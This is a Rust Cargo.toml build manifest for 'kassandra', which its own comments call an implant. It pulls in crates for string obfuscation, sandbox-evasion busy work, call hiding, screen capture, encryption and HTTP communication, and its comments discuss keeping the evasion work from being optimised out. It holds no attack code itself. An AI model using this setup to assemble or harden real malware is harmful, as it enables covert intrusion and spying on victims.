[package]
name = "kassandra"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
once_cell = "1.19"
obfstr = "0.4"
busywork = { git = "https://github.com/PatchRequest/BusyWork", branch = "bump/windows-0.61" }
callghost = { git = "https://github.com/PatchRequest/CallGhost", branch = "master" }
serde = { version = "1.0", features = ["derive"] }
reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }
serde_json = "1.0"
base64 = "0.22.1"
chrono = { version = "0.4", features = ["clock"] }
hmac = "0.12"
sha2 = "0.10"
hex = "0.4"
uuid = { version = "1", features = ["v4"] }
aes = "0.8"
getrandom = "0.2"
lazy_static = "1.5.0"
windows-sys = { version = "0.48", features = [
  "Win32_System_Threading",
  "Win32_Foundation",
] }
windows = { version = "0.61.1", features = ["Win32", "Win32_System", "Win32_System_Com", "Win32_System_Memory"] }
ntapi = "0.4.1"
winapi = { version = "0.3", features = [
    "minwindef",
    "ntdef",
    "processthreadsapi",
    "errhandlingapi",
    "winnt",
    "winbase",
    "lmcons",
    "heapapi",
    "memoryapi",
    "synchapi",
    "threadpoollegacyapiset",
    "sddl",
    "securitybaseapi",
    "handleapi",
    "windef",    # <- for HDC, HBITMAP etc.
    "wingdi",    # <- for BitBlt, CreateCompatibleDC, etc.
    "winuser",   # <- for GetDC, GetSystemMetrics, etc.
    "fileapi",
    "libloaderapi",
    "sysinfoapi"
] }
image = { version = "0.24", default-features = false, features = ["png", "ico"] }
tiny_http = "0.12"
zip = "0.6"

[profile.release]
strip = true
# Fat LTO across crates: smaller binary, longer builds. Safe for BusyWork —
# helpers::{idle,churn,startup_delay} already wrap `.run()` in `black_box`,
# so the optimizer cannot treat the work as dead code and delete it.
lto = true
# Single codegen unit gives LTO a full view of the crate (more size/opt).
codegen-units = 1
# Keep default opt-level=3 (speed). Do NOT use "z" here: BusyWork intensity
# is real work; size-min opts are unnecessary risk for the implant core.
# panic = "abort" left off — keeps normal unwind; debug_log panic hook ok either way.

[features]
default = []
tailscale = []
no_console = []
# Lab-only: write lifecycle diagnostics to %TEMP%\kassandra_debug.log
debug_log = []
